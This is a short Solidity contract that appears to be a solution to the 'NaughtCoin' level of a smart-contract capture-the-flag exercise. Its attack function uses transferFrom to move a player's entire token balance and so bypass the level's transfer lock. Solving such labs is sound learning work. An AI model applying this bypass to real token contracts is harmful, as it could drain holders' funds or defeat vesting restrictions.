// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../LevelsContracts/#15 NaughtCoin.sol';

contract NaughtCoinHack {

  function attack(address _target, address _player) public {
    NaughtCoin naughtCoin = NaughtCoin(_target);
    naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player));
  }
}